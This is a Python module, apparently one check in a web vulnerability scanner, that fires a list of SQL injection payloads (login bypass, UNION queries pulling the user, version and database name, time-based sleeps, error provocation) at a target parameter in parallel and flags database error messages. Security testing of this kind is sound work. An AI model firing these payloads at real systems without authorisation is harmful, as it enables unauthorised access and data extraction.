import requests
from ..models import CheckResult

def check(base_url, scenario, logger):
    url = f"{base_url}{scenario.target}"
    param = scenario.config.get("param", "id")
    
    # Real-world SQLi Payloads (Union-Based, Time-Based, Error-Based)
    payloads = [
        # 1. Auth Bypass / Tautologies
        "' OR '1'='1",
        "' OR 1=1 --", 
        "admin' --",
        
        # 2. UNION Based Extraction (Generic columns assumption)
        "' UNION SELECT 1, @@version --", 
        "' UNION SELECT 1, user(), database() --",
        "' UNION ALL SELECT NULL, NULL, NULL, CONCAT(0x3a,user(),0x3a) --",
        
        # 3. Time-Based Blind (The "Killer" - attempting to freeze the DB)
        "'; WAITFOR DELAY '0:0:5'--", # SQL Server
        "' OR SLEEP(5)--",            # MySQL
        "' || pg_sleep(5)--",         # PostgreSQL
        
        # 4. Error Provocation
        "1' ORDER BY 9999--+",
        "' AND 1=CONVERT(int, (SELECT @@version)) --"
    ]
    
    # Error signatures
    errors = {
        "MySQL": ["SQL syntax", "mysql_fetch"],
        "PostgreSQL": ["PG::Error", "syntax error at or near"],
        "Oracle": ["ORA-01756", "quoted string not properly terminated"],
        "SQL Server": ["Unclosed quotation mark", "SQL Server"]
    }
    
    import concurrent.futures
    
    results_found = []
    
    def check_payload(payload):
        try:
            p = {param: payload}
            # Shorter timeout for speed
            resp = requests.get(url, params=p, timeout=3)
            logger.log_request("GET", url, None, p, resp)
            
            # Check for Errors
            for db, sigs in errors.items():
                for sig in sigs:
                    if sig in resp.text:
                        return CheckResult(scenario.id, scenario.type, "VULNERABLE", "HIGH", f"SQL Error discovered ({db}) with payload: {payload}")
            
            # Check for Logic Bypass
            if "Welcome" in resp.text or "admin" in resp.text.lower():
                 if len(resp.text) > 500:
                     return CheckResult(scenario.id, scenario.type, "VULNERABLE", "HIGH", f"Logic Bypass detected (Admin/Full Dump) with payload: {payload}")
        except:
            pass
        return None

    # Parallel Execution
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(check_payload, p) for p in payloads]
        for f in concurrent.futures.as_completed(futures):
            res = f.result()
            if res:
                return res
            
    return CheckResult(scenario.id, scenario.type, "SECURE", None, "No SQL injection symptoms found.")
